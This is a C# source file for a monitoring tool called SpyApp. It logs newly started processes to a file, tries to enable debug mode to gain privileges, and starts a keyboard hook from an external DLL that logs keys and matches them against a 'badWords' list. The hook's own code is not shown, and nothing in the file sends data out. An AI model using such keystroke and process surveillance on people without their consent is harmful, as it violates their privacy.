using SpyAppClasses;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SpyApp
{
    class SpyApp
    {
        [DllImport("SETKBHOOK.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.Cdecl)]
        public static extern void StartMonitKeys(
        [MarshalAs(UnmanagedType.LPStr)] string statsPath,
        [MarshalAs(UnmanagedType.LPStr)] string modPath,
        [MarshalAs(UnmanagedType.LPStr)] string badWordsPath);

        private SpyInfo _spyInfo;
        public SpyApp(SpyInfo spyInfo)
        {
            _spyInfo = spyInfo;
        }
        /// <summary>
        /// Запускаем Spy с учетом SpyInfo
        /// </summary>
        public void On()
        {
            if (_spyInfo.StatsOn)
            {
                Thread statsThread = new Thread(new ThreadStart(ProcessStats));
                statsThread.Start();
            }
            if (_spyInfo.ModerOn)
            {
                Thread keysThread = new Thread(new ThreadStart(PressedKeysStats));
                keysThread.Start();
            }
        }
        private void ProcessStats()
        {
            try
            {
                //запускаем поток с правами администратора
                Process.EnterDebugMode();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message + ". " +
                    "Приложение запущено без прав администратора " +
                    "(системные процессы отслежены не будут!)");
            }

            var currProcsList =
                Process.GetProcesses()
                .ToList();

            while (true)
            {
                var updProcsList =
                    Process.GetProcesses()
                    .ToList();

                var addedPrcs =
                    ComputeAddedProcs(currProcsList, updProcsList);

                if (addedPrcs.Count > 0)
                    LogAddedProcs(addedPrcs);

                currProcsList = updProcsList;
            }
        }
        private List<Process> ComputeAddedProcs(List<Process> oldPrcs, List<Process> newPrcs)
        {
            List<Process> addedProcs = new List<Process>();

            foreach (var np in newPrcs)
            {
                if (oldPrcs.Any(op => op.Id == np.Id) == false)
                    addedProcs.Add(np);
            }

            return addedProcs;
        }
        private void LogAddedProcs(List<Process> prcs)
        {
            string info = string.Empty;

            try
            {
                foreach (var p in prcs)
                {
                    info += $"{p.StartTime} | id = {p.Id} | {p.ProcessName}\n";
                }
            }
            catch (Exception e)
            {
                //для системных процессов нельзя получить StartTime (не хватает прав)
                Console.WriteLine(e.Message);
            }
            WriteToFile(_spyInfo.ProcessesStats, info);
        }
        private void WriteToFile(string path, string info)
        {
            using (StreamWriter sw = new StreamWriter(path, true))
            {
                sw.Write(info);
            }
        }
        private void PressedKeysStats()
        {
            StartMonitKeys("stats.txt", "mods.txt", "badWords.txt");
        }
    }
}
